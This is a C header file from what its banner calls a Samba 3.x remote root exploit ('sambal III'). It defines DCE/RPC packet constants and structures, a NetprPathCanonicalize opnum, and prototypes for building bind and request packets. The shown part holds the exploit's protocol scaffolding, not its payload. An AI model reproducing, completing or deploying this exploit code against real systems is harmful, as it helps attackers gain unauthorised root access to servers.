/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#define DUMMY_VAL32                             0xbade5dee
#define DUMMY_VAL16                             0xb0ef
#define DUMMY_VAL8                              0x69

#define RPC_MAJOR                               0x05
#define RPC_MINOR                               0x00
#define RPC_MAX_PDU_FRAG_LEN                    0x10b8
#define RPC_REQUEST                             0x00
#define RPC_RESPONSE                            0x02
#define RPC_FAULT                               0x03
#define RPC_BINDRESP                            0x10
#define RPC_BIND                                0x0B
#define RPC_BINDACK                             0x0C
#define RPC_BINDNACK                            0x0D
#define FRAG_LEN                                72

#define NetprPathCanonicalize                   31

struct RPC_header {
        char major;
        char minor;
        char pkt_type;
        char flags;
        char pack_type0;
        char pack_type1;
        char pack_type2;
        char pack_type3;
        short frag_len;
        short auth_len;
        unsigned int call_id;
};

struct RPC_response {
        char major;
        char minor;
        char pkt_type;
        char flags;
        char pack_type0;
        char pack_type1;
        char pack_type2;
        char pack_type3;
        short frag_len;
        short auth_len;
        unsigned int call_id;
        unsigned int alloc_hint;
        short context_id;
        char cancel_count;
        unsigned int status;
};

struct RPC_header_rb {
        short max_tsize;
        short max_rsize;
        unsigned int assoc_gid;
        char num_contexts;
};

struct rpc_uuid {
        unsigned int time_low;
        unsigned short time_mid;
        unsigned short time_hi;
        unsigned char clock_seq[2];
        unsigned char node[6];
};

struct rpc_uuid2 {
        u_int32_t time_low;
        u_int32_t time_mid;
        u_int32_t time_hi;
        u_int32_t clock_seq[2];
        u_int32_t node[6];
};

struct RPC_interface {
        struct rpc_uuid interface_uuid;
        short version_major;
        short version_minor;
        struct rpc_uuid transfer_syntax;
        unsigned int syntax_ver;
};

void RPC_build_bind_request(char *buffer, size_t length, struct rpc_uuid *uuid, struct rpc_uuid *syntax, unsigned int uuid_ver_major, unsigned int uuid_ver_minor);
void RPC_build_interface_uuid(char *uuid_string, char *syntax_string, struct rpc_uuid *uuid, struct rpc_uuid *syntax);
void RPC_put_uuid(char *uuid_string, struct rpc_uuid *uuid);
size_t RPC_build_request(char *buffer, size_t length, size_t frag_len, int opnum, char *rpc_data, size_t rpc_length);

